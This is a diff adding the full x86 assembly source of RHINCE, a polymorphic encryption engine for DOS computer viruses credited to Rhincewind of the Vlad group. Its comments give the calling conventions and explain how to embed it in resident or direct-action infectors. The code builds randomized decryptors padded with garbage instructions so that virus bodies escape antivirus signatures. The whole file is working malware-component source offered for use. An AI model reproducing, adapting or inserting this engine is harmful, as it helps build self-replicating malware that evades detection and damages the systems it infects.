@@ -1,0 +1,217 @@
+; RHINCE, The Rickety and Hardly Insidious yet New Chaos Engine, v1.0,
+; By Rhincewind [Vlad]
+;
+; This here code is a tiny 100% table-driven engine styled after the DSCE.
+; The big benefit of the DSCE approach is that you no longer have to keep
+; track of a counter, pointer or any other register.
+;
+; Calling parameters:
+;
+; CX            Length of code to encrypt
+; DS:DX         32-bit pointer to code to encrypt
+; BP            Offset encrypted code will be run at.
+;
+; Return parameters:
+; CX            Length of decryptor + decrypted code
+; DS:DX         32-bit pointer to encrypted code
+;
+; The engine is a mere 416 bytes in length. Like the MtE, it must be called
+; at the same offset as in the assembled version. This requirement makes it
+; a bit tougher to implement this engine in generic direct action infectors,
+; as they will have to relocate CS:IP. For the structure of a resident
+; infector it makes no difference. Also, the encrypted code will be placed
+; directly after the engine, at the 'polycode' label. If this is inconvenient,
+; simply move the label.
+;
+; I wrote this one to see how small an engine of this type can get, as
+; the original DSCE is very much overweight. It's trivial to detect, but hey,
+; it's still an engine.
+;
+; Rhince.
+
+mut_eng:        push dx
+                inc cx
+                shr cx,1
+                mov di, offset polycode
+                mov si, offset insert_table
+                mov word ptr [si-(insert_table-codelen)],cx
+                call get_rand
+                mov word ptr [si-(insert_table-seed)],ax
+genstart:       mov dx,9
+gen_decryptor:  call get_rand
+                and ax,0fh              ;Bump this up for kicks.
+do_cx_rnd:      push ax
+                mov ax, (endgarbage-garbagetbl)/2
+                call rand_in_range
+                xchg ax,bx
+                add bx,bx
+                call word ptr [garbagetbl+bx]
+                pop ax
+                dec ax
+                jns do_cx_rnd
+                mov ax, 0c72eh
+                stosw
+                mov al, 06
+                stosb
+                mov word ptr [si],di
+                cmpsw
+                stosw
+                dec dx
+                jnz gen_decryptor
+                mov ax, 0ebh
+                stosw
+                mov cx,9
+                push cx
+fill_er_up:     call get_rand
+                stosw
+                loop fill_er_up
+                pop cx
+                push di
+                db 08dh,083h
+                dw -(offset polycode)
+                mov startptr,ax
+                sub ax, (end_decryptor-decryptor)
+                mov si, offset decryptor
+                mov bx, offset insert_table
+fill_values:    mov di, word ptr ds:[bx]
+                stosw
+                movsw
+                inc bx
+                inc bx
+                inc ax
+                inc ax
+                loop fill_values
+                pop di
+                pop si
+                mov cx, codelen
+encrypt_loop:   lodsw
+                xor ax, seed
+                stosw
+                loop encrypt_loop
+                mov cx, di
+                mov dx, offset polycode
+                sub cx,dx
+                ret
+rnd_onebyters:  mov bx, offset onebyters
+                mov ax, (end_onebyters-onebyters)
+xlat_stosb:     call rand_in_range
+                xlat
+                stosb
+_ret:           ret
+onebyters       db 0fdh,0fch,0fbh,0f9h,0f8h,0f5h,0d7h,0cch
+                db 9fh,9eh,99h,98h,97h,96h,95h
+                db 40h,41h,42h,43h,45h,46h,47h,48h,49h,4ah,4bh,4dh,4eh,4fh
+                db 93h,92h,91h,90h,3fh,37h,2fh,27h
+end_onebyters:
+seg_overrides   db 26h,2eh,36h,3eh
+rnd_lds_les:    call get_rand
+                jns no_override
+                mov ax, 4
+                mov bx, offset seg_overrides
+                call xlat_stosb
+no_override:    mov ax, (endfirstbytes-firstbytes)
+                mov bx, offset firstbytes
+                call xlat_stosb
+                xchg ax,cx
+get_nother:     call get_rand
+                test cl,1
+                jz no_sp_test
+sp_test:        mov ah,al
+                and ah,111000b
+                cmp ah,100000b
+                jz get_nother
+no_sp_test:     stosb
+                xchg bx,ax
+                call get_rand
+                mov bh,bl
+                and bh,11000111b
+                cmp bh,110b
+                jz two_extra
+                cmp bl, 0c0h
+                jae no_extra_bytes
+                cmp bl, 40h
+                jb no_extra_bytes
+                cmp bl, 80h
+                jb one_extra
+two_extra:      stosb
+                xchg ah,al
+one_extra:      stosb
+no_extra_bytes: ret
+firstbytes      db 2,3,0ah,0bh,12h,13h,1ah,1bh,22h,23h,2ah,2bh,32h,33h,38h
+                db 39h,3ah,3bh,8ah,8bh
+endfirstbytes:
+rnd_mov:        call get_rand
+                and al,0fh
+                cmp al,0ch
+                jz rnd_mov
+                add al, 0b0h
+                stosb
+                xchg ax,bx
+                call get_rand
+                cmp bl,0b8h
+                jb one_extra
+rnd_flowcontrol:mov ax, (end_flowcontrol-flowcontrol)
+                mov bx, offset flowcontrol
+                call xlat_stosb
+                xor al,al
+                stosb
+                ret
+flowcontrol     db 70h,71h,72h,73h,74h,75h,76h,77h,78h,79h,7ah,7bh,7ch,7dh,7eh,7fh
+                db 0e0h,0e1h,0e2h,0e3h
+end_flowcontrol:
+rnd_mov2:       mov ax, (end_mov_ops-mov_ops)
+                mov bx, offset mov_ops
+                call xlat_stosb
+                xchg ax,cx
+                call get_rand
+                jns no_inc
+                inc cx
+                mov byte ptr ds:[di-1],cl
+                jmp one_byte2
+no_inc:         stosb
+                ret
+one_byte2:      stosw
+                ret
+mov_ops         db 04h,0ch,14h,1ch,24h,2ch,34h,3ch,0a8h
+end_mov_ops:
+rand_in_range:  push bx
+                push dx
+                xchg ax,bx
+                call get_rand
+                xor dx,dx
+                div bx
+                xchg ax,dx
+                pop dx
+                pop bx
+                ret
+get_rand:       in al,40h       ;I'm not too worried about RNG prediction
+                xchg al,ah      ;attacks against an engine so vulnerable
+                in al,40h       ;to the easier things in life.
+                xor ax, 0FFFFh
+                org $-2
+Randomize       dw ?
+                mov randomize,ax
+                ret
+garbagetbl:     dw offset rnd_onebyters
+                dw offset rnd_mov
+                dw offset rnd_lds_les
+                dw offset rnd_mov2
+                dw offset rnd_flowcontrol
+endgarbage:
+decryptor:      cld
+                mov si, 1234h
+                org $-2
+startptr        dw ?
+                mov cx, 1234h
+                org $-2
+codelen         dw ?
+decryptloop:    xor word ptr cs:[si], 1234h
+                org $-2
+seed            dw ?
+                lodsw
+                loop decryptloop
+                dw 01ebh
+                db ?
+end_decryptor:
+insert_table:   dw 9 dup (?)
+polycode:
